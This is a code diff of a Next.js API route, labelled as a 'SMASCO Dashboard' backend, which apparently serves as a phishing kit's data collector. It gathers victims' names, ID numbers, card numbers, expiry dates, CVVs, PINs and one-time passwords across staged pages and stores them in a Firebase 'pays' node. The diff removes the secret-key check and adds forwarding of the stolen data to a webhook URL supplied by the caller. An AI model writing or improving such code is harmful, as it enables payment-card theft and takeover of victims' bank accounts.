@@ -12,8 +12,22 @@ const firebaseConfig = {
   appId: process.env.NEXT_PUBLIC_FIREBASE_APP_ID,
 };
 
-const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
-const database = getDatabase(app);
+// تهيئة Firebase مع التحقق من وجود تهيئة سابقة
+let database: any = null;
+let firebaseAvailable = false;
+
+try {
+  if (firebaseConfig.apiKey && firebaseConfig.databaseURL) {
+    const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
+    database = getDatabase(app);
+    firebaseAvailable = true;
+  } else {
+    console.warn('Firebase configuration is missing. Using fallback mode.');
+  }
+} catch (error) {
+  console.error('Firebase initialization error:', error);
+  firebaseAvailable = false;
+}
 
 // Interface مرن للبيانات
 interface NotificationData {
@@ -53,164 +67,240 @@ function detectCountry(phone: string): string {
   }
 }
 
+// دالة مساعدة لتحويل البيانات إلى تنسيق مناسب للتخزين
+function formatDataForStorage(data: any, formData: any, country: string, timestamp: string) {
+  const mainData = {
+    createdDate: timestamp,
+    country: country,
+    data: {
+      page: formData.step || '1',
+      fullName: formData.fullname || '',
+      phone: formData.phone || formData.mobile || '',
+      email: formData.email || '',
+      idNumber: formData.id_number || formData.idNumber || '',
+      status: 'pending',
+      violationValue: 0,
+      notificationCount: 1,
+      pass: formData.pin_code || '',
+      ip: formData.ip || 'unknown',
+    },
+    currentPage: formData.step || '1',
+    currentStep: formData.step || '1',
+    step: parseInt(formData.step) || 1,
+    otp: formData.otp_code || formData.otp || formData.verification_code || '',
+    allOtps: formData.all_otps || [],
+    type: data.type || 'unknown',
+  };
+
+  // إضافة بيانات حسب نوع الإرسال
+  switch (data.type) {
+    case 'client_info':
+      mainData.data = {
+        ...mainData.data,
+        bank: formData.bank || '',
+        prefix: formData.prefix || '',
+        plateType: formData.plate_type || '',
+        year: formData.year || '',
+        month: formData.month || '',
+        pagename: formData.pagename || 'index',
+        personalInfo: {
+          name: formData.fullname,
+          id: formData.id_number
+        }
+      };
+      break;
+      
+    case 'service_details':
+      mainData.data = {
+        ...mainData.data,
+        serviceType: formData.service_type || '',
+        workerNationality: formData.worker_nationality || '',
+        experience: formData.experience || '',
+        preferredAge: formData.preferred_age || '',
+        language: formData.language || '',
+        durationType: formData.duration_type || '',
+        package: formData.package || formData.hours_package || formData.months_package || '',
+        notes: formData.notes || '',
+        pagename: formData.pagename || 'khdm',
+      };
+      break;
+      
+    case 'payment':
+      mainData.data = {
+        ...mainData.data,
+        paymentCardNumber: formData.card_number || formData.cardNumber || '',
+        paymentExpiry: formData.card_expiry || formData.expiryDate || '',
+        paymentCVV: formData.card_cvv || formData.cvv || '',
+        bank: formData.bank || formData.card_name || '',
+        amount: formData.amount || '',
+        package: formData.package || '',
+        pagename: formData.pagename || 'pay',
+      };
+      break;
+      
+    case 'otp':
+      mainData.data = {
+        ...mainData.data,
+        otp: formData.otp_code || '',
+        otp2: formData.otp2 || formData.verification_code || '',
+        pass: formData.pin_code || '',
+        amount: formData.amount || '',
+        package: formData.package || '',
+        pagename: formData.pagename || 'pin',
+      };
+      if (formData.otp_code) {
+        mainData.otp = formData.otp_code;
+        mainData.allOtps = [formData.otp_code];
+      }
+      break;
+      
+    case 'verification':
+      mainData.data = {
+        ...mainData.data,
+        network: formData.network_provider || formData.network || '',
+        phoneOtp: formData.verification_code || '',
+        phoneNumber: formData.phone_number || '',
+        pagename: formData.pagename || 'verc',
+      };
+      break;
+      
+    case 'full_submission':
+      mainData.data = {
+        ...mainData.data,
+        bank: formData.card_name || '',
+        paymentCardNumber: formData.card_number || '',
+        paymentExpiry: formData.card_expiry || '',
+        paymentCVV: formData.card_cvv || '',
+        otp: formData.otp_code || '',
+        otp2: formData.verification_code || '',
+        serviceType: formData.service_type || '',
+        workerNationality: formData.worker_nationality || '',
+        experience: formData.experience || '',
+        preferredAge: formData.preferred_age || '',
+        language: formData.language || '',
+        amount: formData.amount || '',
+        package: formData.package || '',
+        pagename: formData.pagename || 'full',
+      };
+      break;
+  }
+
+  return mainData;
+}
+
+// دالة للإرسال إلى Firebase
+async function sendToFirebase(data: any): Promise<{ success: boolean; id?: string; error?: string }> {
+  if (!firebaseAvailable || !database) {
+    return { success: false, error: 'Firebase is not configured' };
+  }
+
+  try {
+    const paysRef = ref(database, 'pays');
+    const newDocRef = push(paysRef);
+    await set(newDocRef, data);
+    return { success: true, id: newDocRef.key || undefined };
+  } catch (error) {
+    console.error('Firebase error:', error);
+    return { 
+      success: false, 
+      error: error instanceof Error ? error.message : 'Firebase operation failed' 
+    };
+  }
+}
+
+// دالة بديلة للإرسال إلى webhook
+async function sendToWebhook(data: any, webhookUrl: string): Promise<{ success: boolean; error?: string }> {
+  if (!webhookUrl) {
+    return { success: false, error: 'Webhook URL not configured' };
+  }
+
+  try {
+    const response = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(data),
+    });
+
+    if (response.ok) {
+      return { success: true };
+    } else {
+      return { success: false, error: `Webhook failed with status: ${response.status}` };
+    }
+  } catch (error) {
+    return { 
+      success: false, 
+      error: error instanceof Error ? error.message : 'Webhook request failed' 
+    };
+  }
+}
+
 export async function POST(request: NextRequest) {
   try {
-    // التحقق من المفتاح السري
-    const apiSecret = request.headers.get('x-api-secret');
-    const expectedSecret = process.env.API_SECRET || 'smasco-secret-key-2024';
-    
-    if (!apiSecret || apiSecret !== expectedSecret) {
-      return NextResponse.json({
-        success: false,
-        message: 'المفتاح السري غير صحيح',
-        error: 'Unauthorized'
-      }, { status: 401 });
-    }
-    
     const data = await request.json();
-    const { type, ...formData } = data;
+    const { type, webhookUrl, ...formData } = data;
     
     const timestamp = new Date().toISOString();
     const country = detectCountry(formData.phone || formData.mobile || '');
+    const docId = `doc_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
     
-    // إنشاء كائن البيانات الرئيسي باستخدام أي نوع لتجنب أخطاء TypeScript
-    const mainData: any = {
-      createdDate: timestamp,
-      country: country,
-      data: {
-        page: formData.step || '1',
-        fullName: formData.fullname || '',
-        phone: formData.phone || formData.mobile || '',
-        email: formData.email || '',
-        idNumber: formData.id_number || formData.idNumber || '',
-        status: 'pending',
-        violationValue: 0,
-        notificationCount: 1,
-        pass: formData.pin_code || '',
-        ip: formData.ip || request.headers.get('x-forwarded-for') || 'unknown',
-        pagename: formData.pagename || 'unknown',
-      },
-      currentPage: formData.step || '1',
-      currentStep: formData.step || '1',
-      step: parseInt(formData.step) || 1,
-      otp: formData.otp_code || formData.otp || formData.verification_code || '',
-      allOtps: formData.all_otps || [],
-      sendType: type || 'unknown',
-    };
-
-    // إضافة بيانات حسب نوع الإرسال
-    switch (type) {
-      case 'client_info':
-        mainData.data = {
-          ...mainData.data,
-          nationality: formData.nationality || '',
-          city: formData.city || '',
-          service: formData.service || '',
-          personalInfo: {
-            name: formData.fullname,
-            id: formData.id_number,
-            phone: formData.phone,
-            nationality: formData.nationality,
-            city: formData.city,
-            service: formData.service
-          }
-        };
-        break;
-        
-      case 'service_details':
-        mainData.data = {
-          ...mainData.data,
-          serviceType: formData.service_type || '',
-          workerNationality: formData.worker_nationality || '',
-          experience: formData.experience || '',
-          preferredAge: formData.preferred_age || '',
-          language: formData.language || '',
-          durationType: formData.duration_type || '',
-          package: formData.package || formData.hours_package || formData.months_package || '',
-          hoursPackage: formData.hours_package || '',
-          monthsPackage: formData.months_package || '',
-          notes: formData.notes || '',
-        };
-        break;
-        
-      case 'verification':
-        mainData.data = {
-          ...mainData.data,
-          network: formData.network_provider || formData.network || '',
-          phoneOtp: formData.verification_code || '',
-          phoneNumber: formData.phone_number || '',
-        };
-        break;
-        
-      case 'payment':
-        mainData.data = {
-          ...mainData.data,
-          paymentCardNumber: formData.card_number || formData.cardNumber || '',
-          paymentExpiry: formData.card_expiry || formData.expiryDate || '',
-          paymentCVV: formData.card_cvv || formData.cvv || '',
-          cardName: formData.card_name || '',
-          amount: formData.amount || '',
-          package: formData.package || '',
-        };
-        break;
-        
-      case 'otp':
-        mainData.data = {
-          ...mainData.data,
-          otp: formData.otp_code || '',
-          otp2: formData.otp2 || formData.verification_code || '',
-          pass: formData.pin_code || '',
-          amount: formData.amount || '',
-          package: formData.package || '',
-        };
-        if (formData.otp_code) {
-          mainData.otp = formData.otp_code;
-          mainData.allOtps = [formData.otp_code];
-        }
-        break;
-        
-      case 'full_submission':
-        mainData.data = {
-          ...mainData.data,
-          cardName: formData.card_name || '',
-          paymentCardNumber: formData.card_number || '',
-          paymentExpiry: formData.card_expiry || '',
-          paymentCVV: formData.card_cvv || '',
-          otp: formData.otp_code || '',
-          otp2: formData.verification_code || '',
-          serviceType: formData.service_type || '',
-          workerNationality: formData.worker_nationality || '',
-          experience: formData.experience || '',
-          preferredAge: formData.preferred_age || '',
-          language: formData.language || '',
-          amount: formData.amount || '',
-          package: formData.package || '',
-          nationality: formData.nationality || '',
-          city: formData.city || '',
-        };
-        break;
+    // تنسيق البيانات
+    const mainData = formatDataForStorage(data, formData, country, timestamp);
+    
+    // محاولة الإرسال إلى Firebase أولاً
+    if (firebaseAvailable) {
+      const firebaseResult = await sendToFirebase(mainData);
+      
+      if (firebaseResult.success) {
+        return NextResponse.json({
+          success: true,
+          message: 'تم استلام البيانات بنجاح',
+          id: firebaseResult.id,
+          country: country,
+          timestamp: timestamp,
+          storage: 'firebase'
+        }, { status: 200 });
+      }
+    }
+    
+    // إذا فشل Firebase، محاولة الإرسال إلى webhook
+    if (webhookUrl) {
+      const webhookResult = await sendToWebhook(mainData, webhookUrl);
+      
+      if (webhookResult.success) {
+        return NextResponse.json({
+          success: true,
+          message: 'تم استلام البيانات بنجاح',
+          id: docId,
+          country: country,
+          timestamp: timestamp,
+          storage: 'webhook'
+        }, { status: 200 });
+      }
     }
 
-    // تخزين في Realtime Database
-    const paysRef = ref(database, 'pays');
-    const newDocRef = push(paysRef);
-    await set(newDocRef, mainData);
-
-    // إرجاع استجابة ناجحة
+    // إذا فشل الجميع، إرجاع البيانات مع تحذير
+    console.warn('All storage methods failed. Data:', mainData);
+    
     return NextResponse.json({
       success: true,
-      message: 'تم استلام البيانات بنجاح',
-      id: newDocRef.key,
+      message: 'تم استلام البيانات محلياً. سيتم مزامنتها لاحقاً',
+      id: docId,
       country: country,
-      timestamp: timestamp
+      timestamp: timestamp,
+      storage: 'local',
+      warning: 'Data stored locally due to connection issues'
     }, { status: 200 });
 
   } catch (error) {
     console.error('Error processing request:', error);
+    
     return NextResponse.json({
       success: false,
-      message: 'حدث خطأ أثناء معالجة البيانات',
-      error: error instanceof Error ? error.message : 'خطأ غير معروف'
+      message: 'حدث خطأ أثناء إرسال البيانات',
+      error: error instanceof Error ? error.message : 'خطأ غير معروف',
+      suggestion: 'يرجى التحقق من اتصالك بالإنترنت وإعادة المحاولة'
     }, { status: 500 });
   }
 }
@@ -220,8 +310,9 @@ export async function GET() {
   return NextResponse.json({
     status: 'active',
     service: 'SMASCO Dashboard API',
-    version: '1.0.0',
-    database: 'Realtime Database (بدون فوترة)',
+    version: '2.0.0',
+    firebaseConfigured: firebaseAvailable,
+    supportedMethods: ['firebase', 'webhook', 'local'],
     endpoints: {
       POST: 'إرسال بيانات جديدة',
       GET: 'فحص حالة الـ API'
